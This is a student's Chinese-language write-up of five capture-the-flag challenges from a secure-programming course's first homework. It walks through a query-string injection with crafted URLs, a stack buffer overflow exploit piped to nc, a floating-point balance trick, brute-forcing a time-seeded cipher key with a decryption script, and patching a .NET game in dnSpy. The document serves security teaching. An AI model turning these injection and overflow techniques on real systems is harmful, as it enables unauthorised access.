###### tags: `程式安全`
# Secure Programming HW0 Writeup
## owoHub
### 解法:
打開source code後發現下面這段code
仔細閱讀發現它會吃/auth後面放的username與cute參數，經過type與regular expression檢查後放到userInfo裡面，最後對Internal Server發request取得flag
```javascript
app.get('/auth', (request, response) => {
    const { username, cute } = request.query;

    if (typeof username !== "string" || typeof cute !== "string" ||
        username === "" || !cute.match("(true|false)$")) {
        response.send({ error: "Whaaaat owo?" });
        return;
    }

    if (username.match(/[^a-z0-9]+/i)) {
        response.send({ error: "`Username` should contain only letters & numbers, owo." });
        return;
    }

    const userInfo = `{"username":"${username}","admin":false,"cute":${cute}}`;

    const api = `http://127.0.0.1:9487/?data=${userInfo}&givemeflag=no`;
    http.get(api, resp => {
        resp.setEncoding("utf-8");
        if (resp.statusCode === 200)
            resp.on('data', data => response.send(data));
        else
            response.send({ error:  "qwq..." });
    });
})
```
而從authServer的判斷式來看，必須讓givemeflag為"yes"以及admin為true才能拿到FLAG
```javascript
if (givemeflag === "yes" && userInfo.admin) 
// You don't need to be cute to get the flag ouo!
        response.send(FLAG);
```
可以控制的輸入為username與cute，開始尋找檢查的漏洞
檢查regular expression後發現username只能輸入英文與數字沒有漏洞，而cute只有結尾要是true或false，前面放什麼並沒有限制，這樣就可以塞進奇怪的東西
```
!cute.match("(true|false)$")
```
由於它會把cute直接放進userInfo裡面，而JSON後面的變數值會取代前面的變數值，把"admin":true配合逗號放入cute裡面，剛好也是true結尾符合regex
```
https://owohub.zoolab.org/auth?username=fuck&cute=true,"admin":true
```
然後還要把givemeflag改成yes才能拿到flag，但是它送給authServer的request中預設givemeflag為no
由於request的網址是把userInfo直接塞進來並在外面包上{}，一樣可以透過cute補上}同時用&塞入givemeflag參數
然而直接寫&後面會被視為另一個參數然後被request.query篩掉，所以改寫%26來讓它以為跟cute是同一個參數，最後再補上一個%26{true，把url後半段串起來同時符合cute的regex
```
https://owohub.zoolab.org/auth?username=fuck&cute=true,%22admin%22:true,%22hello%22:true}
%26givemeflag=yes%26{true
```
但是因為有兩個givemeflag，query會把值串在一起導致givemeflag判斷失敗，還是必須要註解掉givemeflag=no
想了半天之後，想起凱哥的講義裡講url的時候有講到fragment這個東西，剛好可以拿來用
為了把givemeflag=no蓋掉，我們使用fragment(#)，一樣為了避免被request.query篩掉使用%23，把上面的%26改成%23就可以得到flag
```
https://owohub.zoolab.org/auth?username=fuck&cute=true,%22admin%22:true,%22hello%22:true}
%26givemeflag=yes%23{true
```
flag如下:
>FLAG{owo_ch1wawa_15_th3_b35t_uwu!!!}
## Cafe Overflow
### 解法:
首先用file指令檢查執行檔的類型確定是ELF 64-bit LSB executable，可在linux執行
之後使用gdb-peda執行CafeOverflow
先用checksec指令確認保護機制，發現沒有開PIE，可以直接輸入位址
利用info function找到main函數並用disas main查看
找到了scanf這個有buffer overflow漏洞的函數
```
0x000000000040124c <+134>:	call   0x401070 <__isoc99_scanf@plt>
```
然後找一下stack的大小是多少，發現到呼叫scanf為止只有-16，所以大小為16
```
0x00000000004011ca <+4>:	sub    rsp,0x10
```
stack的大小16byte加上rbp的大小8byte之後下面就是return address
接著來研究return address要蓋成多少，有沒有現成的東西可以用
查看func1後發現裡面有呼叫system函數，可以
```
0x00000000004011a8 <+50>:	call   0x401040 <system@plt>
```
於是使用python2的-c幫助輸出hex value，並串上cat來讓接下來可以模仿terminal做輸入，最後把輸出的hex value利用pipe餵給nc連到的網址
```
(python2 -c "print('A'*24 + '\x95\x11\x40\x00\x00\x00\x00\x00')";cat ) | 
nc hw00.zoolab.org 65534
```
輸入後跳出here you go，使用find指令找尋flag的檔案，再用cat開啟取得flag
![](https://i.imgur.com/17nSkb6.png)
flag如下:
>flag{c0ffee_0verfl0win6_from_k3ttle_QAQ}

## The Floating Aquamarine
### 解法:
題目的重點是要透過買賣stone讓balance >= RICH，也就是balance >= 3000
一開始以為可以透過overflow或underflow來讓balance的值從負的轉正，很開心寫了個程式爆搜，搜了半天都找不到覺得怪怪的
後來才想到浮點數有精準度誤差的問題，開始輸一些很大的數字測試
測一側發現買99999999再賣99999998之後，balance會歸零，就有多的一個stone可以拿去賣，可以使balance變正的
這代表99999999與99999998的浮點數表示因為誤差的關係是一樣的
但是輸入有限制是13次，賺一次的流程為買1次賣2次共三次，也就是4次就要完成，1次要賺750以上
往下慢慢找發現99999999與99999989的表示也一樣，10個stone為888.8元符合條件
重複4次成功讓balance >= RICH，拿到flag
flag如下:
>FLAG{floating_point_error_https://0.30000000000000004.com/}
## 解密一下
### 解法:
首先打開encrypt.py，看到了一堆中文???
先把中文全部改回英文以便看懂code(為了避免看不到將一些code換行)
```python
#!/usr/bin/env python3
import time
import random
from typing import List
from io import BufferedReader
from forbiddenfruit import curse


def positive(data, size=4):
    return [int.from_bytes(data[index:index+size], 'big') for index in
    range(0, len(data), size)]

def inverse(data, size=4):
    return b''.join([element.to_bytes(size, 'big') for element in data])

def _encrypt(vector: List[int], key: List[int]):
    count, delta, mask = 0, 0xFACEB00C, 0xffffffff
    for times in range(32):
        count = count + delta & mask
        vector[0] = vector[0] + ((vector[1] << 4) + key[0] & mask ^ (vector[1] + count) 
        & mask ^ (vector[1] >> 5) + key[1] & mask) & mask
        vector[1] = vector[1] + ((vector[0] << 4) + key[2] & mask ^ (vector[0] + count) 
        & mask ^ (vector[0] >> 5) + key[3] & mask) & mask
    return vector

def encrypt(plaintext: bytes, secretkey: bytes):
    ciphertext = b''
    for index in range(0, len(plaintext), 8):
        ciphertext += inverse(_encrypt(positive(plaintext[index:index+8]),
        positive(secretkey)))
    return ciphertext

if __name__ == '__main__':
    flag = open('flag', 'rb').read()
    assert len(flag) == 16
    random.seed(int(t.time()))
    secretkey = random.getrandbits(128).to_bytes(16, 'big')
    ciphertext = encrypt(flag, secretkey)
    print(f'ciphertext = {ciphertext.hex()}')

```
可以發現它開始flag後把flag的內容分成兩個8bytes送進去加密，然後把加密完的結果concat成ciphertext

看完我有兩種思路，一種是同時爆搜明文跟key，一種是把encrypt的操作反過來改寫成decrypt並爆搜key
第一種問題是時間花太久，假設flag的16byte已知FLAG{}這六個，然後假設flag裡面包含大小寫英文及數字，爆明文有10^62 種組合，爆key有2^128 種組合，兩個乘起來有夠大
第二種問題是這種加密能不能反過來操作，一開始我隨便看一下看到shifting就放棄了，想說怎麼可能反向
而且我檢查生key的方法發現它的seed是用time.time()轉int來生的，time.time()是把現在時間扣到1970/01/01的時間，也就是頂多16億多，而且助教一定是最近才跑的，實際上key的可能應該不到50萬
所以我傾向第一種，不過考量了一下出題者的想法覺得第一種實在太無腦而且又會算很久，這才hw0而已應該不會太難，於是還是決定再重做一次第二種解法

重看一次後發現shifting雖然不可逆，但是整個式子其實是做+=，直接-=就反過來了
發現沒問題後，我刻了下面這個decrypt.py，一樣把看不到的部分換行
seed是從星期五凌晨開始往前找，而明文形式我不確定flag是大寫還小寫所以多用了幾種組合
```python
import time
import random
from typing import List

def positive(data, size=4):
    return [int.from_bytes(data[index:index+size], 'big') for index in 
    range(0, len(data), size)]

def negative(vector: List[int]):
    return vector[0].to_bytes(4,'big')+vector[1].to_bytes(4,'big')

def inverse(data, size=4):
    return b''.join([element.to_bytes(size, 'big') for element in data])

def inverse_inv(data: bytes):
    return [int.from_bytes(data[0:4],'big'),int.from_bytes(data[4:8],'big')]


def _encrypt(vector: List[int], key: List[int]):
    count, delta, mask = 0, 0xFACEB00C, 0xffffffff
    for times in range(32):
        count = count + delta & mask
        vector[0] = vector[0] + ((vector[1] << 4) + key[0] & mask ^ (vector[1] + count) & 
        mask ^ (vector[1] >> 5) + key[1] & mask) & mask
        vector[1] = vector[1] + ((vector[0] << 4) + key[2] & mask ^ (vector[0] + count) & 
        mask ^ (vector[0] >> 5) + key[3] & mask) & mask
    return vector
    
def _decrypt(vector: List[int], key: List[int]):
    count, delta, mask = 0, 0xFACEB00C, 0xffffffff
    for times in range(32):
        count = count + delta & mask
    for times in range(32):
        vector[1] = vector[1] - ((vector[0] << 4) + key[2] & mask ^ (vector[0] + count) & 
        mask ^ (vector[0] >> 5) + key[3] & mask) & mask
        vector[0] = vector[0] - ((vector[1] << 4) + key[0] & mask ^ (vector[1] + count) & 
        mask ^ (vector[1] >> 5) + key[1] & mask) & mask
        count = count - delta & mask
    return vector

def encrypt(plaintext: bytes, secretkey: bytes):
    ciphertext = b''
    for index in range(0, len(plaintext), 8):
        ciphertext += inverse(_encrypt(positive(plaintext[index:index+8]),
        positive(secretkey)))

    return ciphertext

def decrypt(ciphertext: bytes, secretkey: bytes):
    first = ciphertext[0:8]
    second = ciphertext[8:16]
    pos1 = negative(_decrypt(inverse_inv(first),positive(secretkey)))
    pos2 = negative(_decrypt(inverse_inv(second),positive(secretkey)))
    return pos1+pos2
'''
if __name__ == '__main__':
    flag = open('flag', 'rb').read()
    assert len(flag) == 16
    random.seed(1)
    secretkey = random.getrandbits(128).to_bytes(16, 'big')
    ciphertext = encrypt(flag, secretkey)
    print(ciphertext)
    print(decrypt(ciphertext,secretkey))
'''
h = '77f905c39e36b5eb0deecbb4eb08e8cb'
ciphertext = bytes.fromhex(h)
assert len(ciphertext) == 16
print(int(time.time()))
#1599977586
t = 1600580643 - 86400*2 - 43200
for i in range(t,0,-1):
    print(i)
    random.seed(i)
    secretkey = random.getrandbits(128).to_bytes(16, 'big')
    plaintext = decrypt(ciphertext,secretkey)
    if plaintext[0:4] == b'flag' or plaintext[0:4] == b'FLAG' or plaintext[0:4] == b'Flag':
        print('success')
        print(plaintext)
        break

```
最後在seed為1599977586時找到flag
flag如下:
>FLAG{4lq7mWGh93}
## EekumBokum
### 解法:
首先打開exe，發現是按上下左右移動拼圖的遊戲，移動成右邊的樣子就可以拿到flag，但是看起來就不像解得開，解開也不用reverse了(X
經過朋友楊晨佑推薦找到dnSpy這個工具
用dnSpy打開程式後可以看到原本的程式碼
![](https://i.imgur.com/iXKAx45.png)
打開Form1的部分仔細檢查
![](https://i.imgur.com/CdiJnkV.png)
發現最下面有兩行code交換了index為13與14的拼圖，也就是左邊區域的拼圖會有兩塊位置錯誤的原因
因為交換的起始點在最右下角的index為15的拼圖，如果讓交換的拼圖變成index為14與15的拼圖就可以換一次就過
使用Edit Method Body的功能將程式碼的index換成14與15
![](https://i.imgur.com/GCichOW.png)
換完後變成下圖
![](https://i.imgur.com/dpfeA2O.png)
之後執行並交換一次即可取得flag
![](https://i.imgur.com/rgwwoVG.png)
flag如下:
>flag{NANI_KORE?(=.=)EEKUM_BOKUM(=^=)EEKUM_BOKUM}

